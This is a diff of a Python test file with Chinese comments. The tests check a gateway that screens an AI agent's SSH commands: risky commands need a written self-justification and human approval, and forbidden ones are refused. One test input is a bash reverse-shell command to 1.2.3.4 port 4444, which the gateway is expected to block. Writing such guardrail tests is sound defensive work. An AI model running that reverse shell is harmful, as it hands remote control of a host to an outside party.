@@ -69,13 +69,13 @@ CASES = [
     ("sudo -i", None, 400, "root shell"),
     ("systemctl restart nginx", None, 428, "高危缺反思 → 428"),
     ("systemctl restart nginx", "  ", 428, "反思只有空格 → 仍 428"),
-    ("systemctl restart nginx", "我是云端Agent，我在8.5，我打算重启8.6上的nginx，确认继续",
+    ("systemctl restart nginx", "我是云端Agent，我在host-5，我打算重启host-6上的nginx，确认继续",
      200, "高危带反思 → 放行执行"),
     ("reboot", None, 428, "reboot 高危"),
     ("systemctl status nginx", None, 200, "普通命令直接放行"),
     ("ls -l /var/log", None, 200, "普通命令直接放行"),
     ("kill -9 12345", None, 428, "强杀进程高危"),
-    ("kill -9 12345", "我是Agent，我在8.4，我要强杀卡死的12345，确认继续", 200, "强杀带反思"),
+    ("kill -9 12345", "我是Agent，我在host-4，我要强杀卡死的12345，确认继续", 200, "强杀带反思"),
     ("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", None, 403, "反弹 shell 禁区"),
 ]
 
@@ -99,7 +99,7 @@ print(f"ask_approval 被调用 {len(seen)} 次：")
 for s in seen:
     print(f"   dangerous={s['dangerous']} 反思={ (s['self_reflection'] or '')[:24] !r}")
 
-# 拒绝原因透传：打桩 ask_approval 模拟"主人拒绝并写了原因"，
+# 拒绝原因透传：打桩 ask_approval 模拟"用户拒绝并写了原因"，
 # 验证 _handle_ssh 把它原样变成 Agent 收到的响应体（与自检 [39]② 同一路径）
 vb.ask_approval = lambda *a, **k: (k["out"].update(
     {"ok": False, "decision": "no", "reason": "我在跑任务，晚点再重启"}) or False)
